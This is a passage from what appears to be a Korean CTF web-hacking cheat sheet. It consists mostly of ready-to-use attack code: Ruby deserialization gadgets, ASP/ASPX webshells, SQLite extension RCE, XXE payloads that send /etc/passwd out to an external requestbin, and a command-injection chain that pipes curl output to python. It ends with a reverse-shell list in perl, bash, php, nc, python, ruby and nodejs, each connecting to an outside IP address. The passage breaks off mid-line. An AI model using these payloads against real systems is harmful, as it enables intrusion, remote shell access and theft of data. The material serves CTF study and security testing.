href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md</a></p></li><li><p>Marshal</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">erb = ERB.allocate</span><br><span class="line">erb.instance_variable_set <span class="symbol">:</span><span class="variable">@src</span>, <span class="string">&quot;`id`&quot;</span></span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, <span class="symbol">:result</span>, <span class="string">&quot;foo&quot;</span>, ActiveSupport::Deprecation</span><br><span class="line">hash = &#123;depr =&gt; <span class="string">&#x27;something&#x27;</span>&#125;</span><br><span class="line">marshalled = Marshal.dump(hash)</span><br><span class="line">print marshalled</span><br></pre></td></tr></table></figure></li><li><p>.NET deserialization</p><ul><li><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></li><li><a href="https://blog.15.165.0.114/2018/10/24/HITCON-CTF-2018-Web/">https://blog.15.165.0.114/2018/10/24/HITCON-CTF-2018-Web/</a></li></ul></li></ul></li></ul><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><ul><li>2버전에서 mac 주소 등을 이용하여 시크릿 알아낼수 있는, 취약함수 존재, CTF에 종종 출제됨 [설명 추가 예정]</li><li>pyjail<ul><li>[삭제 여부 검토]</li></ul></li></ul><h2 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h2><ul><li>생략</li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal]">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory</a> Traversal)</li></ul><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><ul><li>생략</li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection]">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command</a> Injection)</li></ul><h2 id="asp-net-x2F-iis"><a href="#asp-net-x2F-iis" class="headerlink" title="asp.net &#x2F; iis"></a>asp.net &#x2F; iis</h2><ul><li><p>asp webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;kaibro&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;kaibro&quot;)%&gt;</span><br><span class="line">&lt;%ExecuteGlobal request(&quot;kaibro&quot;)%&gt;</span><br><span class="line">&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;</span><br></pre></td></tr></table></figure></li><li><p>aspx webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;kaibro&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if (Request.Files.Count!=0)&#123;Request.Files[0].SaveAs(Server.MapPath(Request[&quot;f&quot;]));&#125;%&gt;</span><br></pre></td></tr></table></figure></li><li><p>ibm038</p><ul><li><a href="https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour">https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour</a></li></ul></li><li><p>__VIEWSTATE</p><ul><li><a href="https://cyku.tw/ctf-hitcon-2018-why-so-serials/">https://cyku.tw/ctf-hitcon-2018-why-so-serials/</a></li></ul></li></ul><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><ul><li>function override</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math:random</span><span class="params">()</span></span> <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">math</span>:<span class="built_in">random</span>())</span><br><span class="line">// <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="GraphQL-Injection"><a href="#GraphQL-Injection" class="headerlink" title="GraphQL Injection"></a>GraphQL Injection</h2><ul><li>추가예정</li></ul><h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection"></a>sql injection</h2><ul><li><p>basic (생략)</p></li><li><p>quine sql injection</p><ul><li><a href="https://blog.rwx.kr/quine-sql-injection/">https://blog.rwx.kr/quine-sql-injection/</a></li></ul></li><li><p>nosql injection</p><ul><li>설명 생략</li></ul></li><li><p>sqlite</p><ul><li>rce via load_extension<ul><li>윈도우 환경이면 UNC 도 사용가능</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// gcc -shared -fPIC evil.c -o evil.so</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int sqlite3_evil_init() &#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int sqlite3__init() &#123;</span><br><span class="line">    system(&quot;touch /tmp/executed&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_extension(&#x27;/tmp/evil.so&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>mysql</p><ul><li>multiquery injection</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=&#x27;select sleep(1)&#x27;;</span><br><span class="line">prepare s from @a;</span><br><span class="line">execute s;</span><br></pre></td></tr></table></figure><ul><li>rand alternative</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when @a:=@a-2 then @a:=2 else @a:=1 end;</span><br></pre></td></tr></table></figure><ul><li>mysql client attack</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lcark/MysqlClientAttack.git</span><br><span class="line"><span class="built_in">cd</span> MysqlClientAttack</span><br><span class="line">python main.py -F /flag</span><br></pre></td></tr></table></figure><ul><li><p>shell command : show columns</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from `tbl`</span><br></pre></td></tr></table></figure></li><li><p>shell command : handler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl OPEN;HANDLER tbl READ FIRST;HANDLER CLOSE</span><br></pre></td></tr></table></figure></li><li><p>list table with innodb &gt; 5.6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from innodb_table_stats;</span><br><span class="line">select * from innodb_index_stats;</span><br></pre></td></tr></table></figure></li><li><p>list table with statistics</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schema_auto_increment_columns</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line">x$schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure></li></ul></li><li><p>waf bypass</p></li></ul><h2 id="XML-External-Entity-Injection"><a href="#XML-External-Entity-Injection" class="headerlink" title="XML External Entity Injection"></a>XML External Entity Injection</h2><ul><li><p>basic (생략)</p></li><li><p>php wrapper (생략)</p></li><li><p>dos (생략)</p></li><li><p>error based (생략)</p></li><li><p>soap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Body&gt;</span><br><span class="line">  &lt;foo&gt;</span><br><span class="line">    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">  &lt;/foo&gt;</span><br><span class="line">&lt;/soap:Body&gt;</span><br></pre></td></tr></table></figure></li><li><p>utf7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span></span><br><span class="line">&lt;@utf7&gt;<span class="meta">&lt;!DOCTYPE r[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY x <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;x;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span>&lt;@/utf7&gt;</span><br></pre></td></tr></table></figure></li><li><p>utf16</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;@UTF_16_3&gt;<span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span><span class="tag">&lt;<span class="name">r</span>&gt;</span>123<span class="tag">&lt;/<span class="name">r</span>&gt;</span>&lt;@/UTF_16_3&gt;</span><br></pre></td></tr></table></figure></li><li><p>oob xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 1.xml</span><br><span class="line">&lt;@UTF_16_3&gt;<span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % x <span class="keyword">SYSTEM</span> <span class="string">&quot;http://git.buuoj.cn/posix/xxe/raw/master/1.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%x;</span></span><br><span class="line"><span class="meta">%p;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span>&lt;@/UTF_16_3&gt;</span><br><span class="line">// 1.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % p <span class="string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://http.requestbin.buuoj.cn/138ccqt1?d=%d;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>syntax violation</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/index.php&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>local dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamsa</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">  &lt;!ENTITY % request &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;</span>file:///x/%file;&amp;#x27;&gt;</span>&quot;&gt;</span></span><br><span class="line"><span class="meta">  %request;%error;&#x27;&gt;</span></span><br><span class="line"><span class="meta">%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>123<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>phar</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ernw</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;phar:///var/www/html/images/gginin/xxxx.jpeg&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;500px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-family</span>=<span class="string">&quot;Verdana&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;40&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>oxml_xxe</p><ul><li><a href="https://github.com/BuffaloWill/oxml_xxe">https://github.com/BuffaloWill/oxml_xxe</a></li><li>DOCX&#x2F;XLSX&#x2F;PPTX, ODT&#x2F;ODG&#x2F;ODP&#x2F;ODS, SVG, XML, PDF, JPG, GIF</li></ul></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul><li>length extension attack<ul><li>[설명추가예정]</li><li><a href="https://github.com/bwall/HashPump">https://github.com/bwall/HashPump</a></li></ul></li><li>Oracle Padding Attack<ul><li>[설명추가예정]</li></ul></li><li>ECB 블록 셔플 공격 (CTF에 나온지는 꽤 되었지만, 나름 범용적인 공격)</li><li>CBC mode - Bit Flipping Attack<ul><li>[설명추가예정]</li></ul></li></ul><h2 id="misc-x2F-universal"><a href="#misc-x2F-universal" class="headerlink" title="misc &#x2F; universal"></a>misc &#x2F; universal</h2><ul><li><p>zip slip attack</p></li><li><p>bad regex bypass</p></li><li><p>race condition</p></li><li><p>bom injection</p></li><li><p>weak rand &#x2F; srand() (언어별로)</p></li><li><p>cron &#x2F; .bashrc &#x2F; .zshrc</p></li><li><p>windows fs regex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target: flag.txt</span><br><span class="line">matched by</span><br><span class="line">1. flag.&gt;&gt;&gt;</span><br><span class="line">2. f&lt;</span><br><span class="line">3. flag&quot;txt</span><br></pre></td></tr></table></figure></li><li><p>time based regex injection</p><ul><li><a href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques">https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques</a></li><li><a href="https://blog.rwx.kr/time-based-regex-injection/">https://blog.rwx.kr/time-based-regex-injection/</a></li></ul></li><li><p>apache solr injection</p><ul><li><a href="https://github.com/veracode-research/solr-injection">https://github.com/veracode-research/solr-injection</a></li></ul></li><li><p>dns rebinding</p><ul><li><code>7f000001.0fa50072.rbndr.us</code></li><li><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></li><li>nodejs 사용하여 dns 서버 구성</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// sudo systemctl disable systemd-resolved</span><br><span class="line">// sudo systemctl stop systemd-resolved</span><br><span class="line"></span><br><span class="line">const dns = require(&#x27;dns2&#x27;);</span><br><span class="line">var check = true;</span><br><span class="line">const server = dns.createServer((req,send) =&gt; &#123;</span><br><span class="line">    const response = new dns.Packet(req);</span><br><span class="line">    check = !check;</span><br><span class="line">    response.header.qr = 1;</span><br><span class="line">    response.answers.push(&#123;</span><br><span class="line">        address: check ? &#x27;127.0.0.1&#x27; : &#x27;1.2.3.4&#x27;,</span><br><span class="line">        type: dns.Packet.TYPE.A,</span><br><span class="line">        class: dns.Packet.CLASS.IN</span><br><span class="line">    &#125;);</span><br><span class="line">    send(response);</span><br><span class="line">&#125;).listen(53);</span><br><span class="line"></span><br><span class="line">// sudo systemctl enable systemd-resolved</span><br><span class="line">// sudo systemctl start systemd-resolved</span><br></pre></td></tr></table></figure></li><li><p>unicode normaliation</p><ul><li>언어마다 다름</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[223] ß (%C3%9F).toUpperCase() =&gt; SS (%53%53)</span><br><span class="line">[304] İ (%C4%B0).toLowerCase() =&gt; i̇ (%69%307)</span><br><span class="line">[305] ı (%C4%B1).toUpperCase() =&gt; I (%49)</span><br><span class="line">[329] ŉ (%C5%89).toUpperCase() =&gt; ʼN (%2bc%4e)</span><br><span class="line">[383] ſ (%C5%BF).toUpperCase() =&gt; S (%53)</span><br><span class="line">[496] ǰ (%C7%B0).toUpperCase() =&gt; J̌ (%4a%30c)</span><br><span class="line">[7830] ẖ (%E1%BA%96).toUpperCase() =&gt; H̱ (%48%331)</span><br><span class="line">[7831] ẗ (%E1%BA%97).toUpperCase() =&gt; T̈ (%54%308)</span><br><span class="line">[7832] ẘ (%E1%BA%98).toUpperCase() =&gt; W̊ (%57%30a)</span><br><span class="line">[7833] ẙ (%E1%BA%99).toUpperCase() =&gt; Y̊ (%59%30a)</span><br><span class="line">[7834] ẚ (%E1%BA%9A).toUpperCase() =&gt; Aʾ (%41%2be)</span><br><span class="line">[8490] K (%E2%84%AA).toLowerCase() =&gt; k (%6b)</span><br><span class="line">[64256] ﬀ (%EF%AC%80).toUpperCase() =&gt; FF (%46%46)</span><br><span class="line">[64257] ﬁ (%EF%AC%81).toUpperCase() =&gt; FI (%46%49)</span><br><span class="line">[64258] ﬂ (%EF%AC%82).toUpperCase() =&gt; FL (%46%4c)</span><br><span class="line">[64259] ﬃ (%EF%AC%83).toUpperCase() =&gt; FFI (%46%46%49)</span><br><span class="line">[64260] ﬄ (%EF%AC%84).toUpperCase() =&gt; FFL (%46%46%4c)</span><br><span class="line">[64261] ﬅ (%EF%AC%85).toUpperCase() =&gt; ST (%53%54)</span><br><span class="line">[64262] ﬆ (%EF%AC%86).toUpperCase() =&gt; ST (%53%54)</span><br></pre></td></tr></table></figure></li><li><p>5 byte command injection</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># generate `ls -t&gt;g` to file &quot;_&quot;</span><br><span class="line">http://host/?cmd=&gt;ls\</span><br><span class="line">http://host/?cmd=ls&gt;_</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;-t\</span><br><span class="line">http://host/?cmd=&gt;\&gt;g</span><br><span class="line">http://host/?cmd=ls&gt;&gt;_</span><br><span class="line"></span><br><span class="line"># generate `curl orange.tw|python` to file &quot;g&quot;</span><br><span class="line">http://host/?cmd=&gt;on</span><br><span class="line">http://host/?cmd=&gt;th\</span><br><span class="line">http://host/?cmd=&gt;py\</span><br><span class="line">http://host/?cmd=&gt;\|\</span><br><span class="line">http://host/?cmd=&gt;tw\</span><br><span class="line">http://host/?cmd=&gt;e.\</span><br><span class="line">http://host/?cmd=&gt;ng\</span><br><span class="line">http://host/?cmd=&gt;ra\</span><br><span class="line">http://host/?cmd=&gt;o\</span><br><span class="line">http://host/?cmd=&gt;\ \</span><br><span class="line">http://host/?cmd=&gt;rl\</span><br><span class="line">http://host/?cmd=&gt;cu\</span><br><span class="line">http://host/?cmd=sh _</span><br><span class="line"></span><br><span class="line"># got shell</span><br><span class="line">http://host/?cmd=sh g</span><br></pre></td></tr></table></figure></li></ul><h2 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h2><h3 id="bucket"><a href="#bucket" class="headerlink" title="bucket"></a>bucket</h3><ul><li><p>public bucket</p><ul><li>list objects</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls s3://a700de6aeab6ef373e7d</span><br></pre></td></tr></table></figure><ul><li>copy objects</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3://b1f507894bee098d7e9d/flag.txt .</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># aws s3api put-bucket-acl --bucket b1f507894bee098d7e9d --acl authenticated-read</span><br><span class="line"># aws s3api put-object-acl --bucket b1f507894bee098d7e9d --key flag.txt --acl authenticated-read</span><br></pre></td></tr></table></figure><ul><li>pre-signed URLs<ul><li><a href="https://n0j.github.io/2017/10/02/aws-s3-ctf.html">https://n0j.github.io/2017/10/02/aws-s3-ctf.html</a></li></ul></li></ul></li></ul><h2 id="one-day-exploit"><a href="#one-day-exploit" class="headerlink" title="one day exploit"></a>one day exploit</h2><ul><li>추가예정</li><li>실효성 낮음</li></ul><h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><ul><li><p>perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;15.165.0.114&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1&#x27;</span></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/15.165.0.114/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure></li><li><p>php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;15.165.0.114&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>nc -e</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 15.165.0.114 8888</span><br></pre></td></tr></table></figure></li><li><p>telnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> backpipe p &amp;&amp; telnet 15.165.0.114 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;15.165.0.114&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>ruby</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;15.165.0.114&quot;,&quot;8888&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>nodejs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.<span class="title class_">Socket</span>(); client.<span class="title function_">connect</span>(<span class="number">8888</span>, <span 